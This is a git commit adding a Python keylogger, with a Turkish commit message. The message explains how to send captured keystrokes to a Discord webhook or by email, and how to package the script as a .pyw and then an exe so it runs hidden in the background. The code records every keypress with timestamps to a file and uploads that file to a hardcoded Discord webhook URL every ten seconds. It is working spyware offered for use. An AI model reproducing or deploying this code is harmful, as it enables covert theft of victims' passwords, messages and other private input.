2d859a0c62bee23c5705cd0968e5cdee6d7ae0ed
Samet <sametfurkan12345@gmail.com>
2024-02-17 21:51:12 +0300

    Keylogger
    Kullanmak için 2 seçenek var keylogger.py içerisindeki webhook_url yi eğer kendi açtığınız sunucuya oluşturduğunuz webhook u eklerseniz loglar oraya düşücektir. Discord sunucuya göndermenin yoludur bu  eğer çalışan kod u yaparsanız mail ile veri transferi oluyor oraya mailinizi ve şifreyi girerseniz bide alıcı maili bu şekilde mail ile veri transferi yapabilirsiniz  bunu exe yapmak içinde ilk önce .py dosyayı arkaplanda çalışması için .pyw uzantılı yapıyoruzki arkaplanda çalışsın sonra .pyw uzantılı dosyamızıda exe yapabilirsiniz çalıştırdığınızda arkaplanda çalışıcaktır.

---
+++ keylogger (Samet)/keylogger.py
@@ -0,0 +1,42 @@
+import keyboard
+import datetime
+import requests
+import time
+import os
+
+word = ""
+interval = 10
+logfile = "keylog.txt"
+webhook_url = "https://discord.com/api/webhooks/1205885490520     IixZIvjPRr4rxIRonxlpxCDNcw3bwVTSbzOcyNPwwBgpDN8WW4"
+
+def on_press(key):
+    global word
+    if key.name in ["space", "enter"]:
+        with open(logfile, "a") as file:
+            file.write(word + " " + key.name + " " + str(datetime.datetime.now()) + "\n")
+        word = ""
+    else:
+        word += key.name
+
+def send_discord_message(file_path):
+    with open(file_path, "rb") as f:
+        file_data = f.read()
+
+    payload = {
+        "content": "Log"
+    }
+
+    response = requests.post(webhook_url, files={"file": file_data}, data=payload)
+
+
+
+
+keyboard.on_press(on_press)
+
+while True:
+    time.sleep(interval)
+    with open(logfile) as file:
+        data = file.read().strip()
+
+    if data:
+        send_discord_message(logfile)
